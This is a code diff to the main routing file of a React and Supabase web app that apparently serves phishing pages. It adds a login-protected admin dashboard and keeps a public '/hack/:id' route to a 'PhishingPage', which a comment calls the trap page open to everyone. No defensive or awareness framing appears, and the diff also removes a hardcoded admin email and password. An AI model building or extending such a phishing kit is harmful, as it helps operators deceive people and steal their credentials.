@@ -1,35 +1,52 @@
-import { BrowserRouter, Routes, Route } from 'react-router-dom';
+import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom';
+import { useEffect, useState } from 'react';
+import { supabase } from './utils/supabase';
+
+// Pages Import
 import Dashboard from './pages/Dashboard';
 import PhishingPage from './pages/PhishingPage';
-import Login from './pages/Login'; // Create this simple auth page using Supabase Auth UI or form
-
-// Simple Auth Page Placeholder
-const Login = () => {
-  const handleLogin = async () => {
-    const { data, error } = await supabase.auth.signInWithPassword({
-      email: 'admin@phishing.com', // Use your actual admin email
-      password: 'password123'
-    });
-    if(error) alert(error.message);
-  };
-
-  return (
-    <div className="h-screen flex items-center justify-center bg-gray-900">
-      <button onClick={handleLogin} className="px-6 py-3 bg-green-500 rounded text-white font-bold">
-        Admin Login
-      </button>
-    </div>
-  );
-};
+import Login from './pages/Login';
 
 function App() {
+  const [session, setSession] = useState(null);
+
+  useEffect(() => {
+    // Check current session
+    supabase.auth.getSession().then(({ data: { session } }) => {
+      setSession(session);
+    });
+
+    // Listen for auth changes
+    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
+      setSession(session);
+    });
+
+    return () => subscription.unsubscribe();
+  }, []);
+
   return (
     <BrowserRouter>
       <Routes>
-        <Route path="/" element={<Login />} /> 
-        {/* Note: In a real app, protect /dashboard with auth check */}
-        <Route path="/dashboard" element={<Dashboard />} />
-        <Route path="/hack/:id" element={<PhishingPage />} />
+        {/* Admin Login - Root Path */}
+        <Route 
+          path="/" 
+          element={!session ? <Login /> : <Navigate to="/dashboard" />} 
+        /> 
+
+        {/* Protected Dashboard - Sirf login ke baad dikhega */}
+        <Route 
+          path="/dashboard" 
+          element={session ? <Dashboard /> : <Navigate to="/" />} 
+        />
+
+        {/* The Trap Page - Sabke liye open hai */}
+        <Route 
+          path="/hack/:id" 
+          element={<PhishingPage />} 
+        />
+
+        {/* 404 Redirect - Agar koi galat URL daale */}
+        <Route path="*" element={<Navigate to="/" />} />
       </Routes>
     </BrowserRouter>
   );
